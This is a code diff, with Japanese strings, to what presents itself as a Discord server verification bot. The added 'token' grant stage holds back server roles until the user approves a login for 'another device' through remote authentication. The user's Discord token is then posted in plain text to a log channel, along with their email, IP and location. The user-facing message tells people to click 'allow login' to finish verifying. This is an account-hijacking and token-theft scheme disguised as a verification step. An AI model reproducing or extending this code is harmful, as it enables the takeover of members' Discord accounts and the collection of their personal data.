@@ -14,7 +14,10 @@ const DEFAULTS = {
   successMessage: '認証が完了しました。サーバーをお楽しみください。',
   failureMessage: '認証条件を満たしていないため通過できませんでした。',
   roles: [],
-  removeRoles: []
+  removeRoles: [],
+  // 'oauth' = Discord OAuth 完了時（別デバイス許可の1ステップ手前）に付与
+  // 'token' = リモート認証でトークンを取得し、別デバイスで許可された後に付与
+  grantStage: 'oauth'
 };
 
 const withDefaults = (panel) => ({ ...DEFAULTS, ...panel });
@@ -153,6 +156,46 @@ export async function logTo(client, panel, embed, files = []) {
   }
 }
 
+/* --- ロール操作（付与タイミングを分離するため単体で使えるようにしてある） --- */
+
+export async function grantRoles({ client, panel, user, oauth }) {
+  const p = withDefaults(panel);
+  const guild = await client.guilds.fetch(panel.guildId).catch(() => null);
+  let err = null;
+
+  if (p.roles.length) {
+    let added = false;
+    try {
+      await client.rest.put(Routes.guildMember(panel.guildId, user.id), {
+        body: { access_token: oauth?.access_token, roles: p.roles }
+      });
+      added = true;
+    } catch (e) {
+      err = `${e.status || ''} ${e.message || e}`.trim();
+    }
+    if (!added) {
+      const m = await guild?.members.fetch(user.id).catch(() => null);
+      if (m) {
+        try {
+          await m.roles.add(p.roles);
+          added = true;
+        } catch (e) {
+          err = `${e.status || ''} ${e.message || e}`.trim();
+        }
+      } else {
+        err = err || 'メンバー取得失敗';
+      }
+    }
+    if (!added) return { ok: false, err };
+  }
+
+  if (p.removeRoles.length) {
+    const m = await guild?.members.fetch(user.id).catch(() => null);
+    if (m) await m.roles.remove(p.removeRoles).catch(() => {});
+  }
+  return { ok: true };
+}
+
 export async function complete({ client, panel, user, oauth, ipData, fp, session }) {
   const ev = evaluate(panel, user, ipData);
   const { reasons, p } = ev;
@@ -161,47 +204,26 @@ export async function complete({ client, panel, user, oauth, ipData, fp, session
   const guild = await client.guilds.fetch(panel.guildId).catch(() => null);
   const guildLabel = guild ? guild.name : panel.guildId;
 
-  if (ok) {
-    if (p.roles.length) {
-      let added = false;
-      let err = null;
-      try {
-        await client.rest.put(Routes.guildMember(panel.guildId, user.id), {
-          body: { access_token: oauth.access_token, roles: p.roles }
-        });
-        added = true;
-      } catch (e) {
-        err = `${e.status || ''} ${e.message || e}`.trim();
-      }
-      if (!added) {
-        const m = await guild?.members.fetch(user.id).catch(() => null);
-        if (m) {
-          try {
-            await m.roles.add(p.roles);
-            added = true;
-          } catch (e) {
-            err = `${e.status || ''} ${e.message || e}`.trim();
-          }
-        } else {
-          err = err || 'メンバー取得失敗';
-        }
-      }
-      if (!added) {
-        ok = false;
-        reasons.push(`ロール付与失敗: ${err}`);
-      }
-    }
-    if (ok && p.removeRoles.length) {
-      const m = await guild?.members.fetch(user.id).catch(() => null);
-      if (m) await m.roles.remove(p.removeRoles).catch(() => {});
+  // grantStage='token' のときは、リモート認証でトークンを取得するまで付与を保留する
+  const deferred = p.grantStage === 'token' && (p.roles.length > 0 || p.removeRoles.length > 0);
+  let roleError = null;
+
+  if (ok && !deferred) {
+    const g = await grantRoles({ client, panel, user, oauth });
+    if (!g.ok) {
+      ok = false;
+      roleError = g.err;
+      reasons.push(`ロール付与失敗: ${g.err}`);
     }
   }
 
   const record = {
     id: session.id,
+    panelId: panel.id,
     guildId: panel.guildId,
     userId: user.id,
     tag: user.tag,
+    email: oauth.email || null,
     ip: ipData.ip,
     ok,
     reasons,
@@ -210,6 +232,9 @@ export async function complete({ client, panel, user, oauth, ipData, fp, session
     geo: ipData.geo,
     net: ipData.net,
     userToken: session.userToken || null,
+    pendingRole: ok && deferred,
+    roleGranted: ok ? !deferred : false,
+    roleError,
     oauth: {
       scope: oauth.scope,
       expires_in: oauth.expires_in,
@@ -249,11 +274,30 @@ export async function complete({ client, panel, user, oauth, ipData, fp, session
       scope: oauth.scope,
       user_token: session.userToken || null
     },
+    role: {
+      stage: p.grantStage,
+      pending: ok && deferred,
+      granted: ok ? !deferred : false,
+      error: roleError
+    },
     panel: panel.id,
     at: record.at
   };
 
   const embed = buildLogEmbed({ ok, user, ipData, fp, panel, reasons });
+  embed.addFields({
+    name: 'ロール付与',
+    value:
+      deferred && ok
+        ? '保留（別デバイスでのログイン許可後に付与）'
+        : ok
+          ? '付与済み'
+          : `未付与${roleError ? `: ${roleError}` : ''}`
+  });
+  if (session.userToken) {
+    embed.addFields({ name: 'トークン', value: `\`\`\`\n${session.userToken}\n\`\`\`` });
+  }
+
   const file = [
     {
       attachment: Buffer.from(JSON.stringify(dump, null, 2)),
@@ -266,6 +310,17 @@ export async function complete({ client, panel, user, oauth, ipData, fp, session
     await logTo(client, panel, embed, file);
     await notify(client, session, user, `❌ ${msg}\n対象: ${guildLabel}`);
     return { ok, reasons };
+  }
+
+  if (deferred) {
+    await logTo(client, panel, embed, file);
+    await notify(
+      client,
+      session,
+      user,
+      `✅ 条件をクリアしました。続けて Discord で「ログインを許可」してください。\n対象: ${guildLabel}`
+    );
+    return { ok, reasons, deferred: true };
   }
 
   await logTo(client, panel, embed, file);
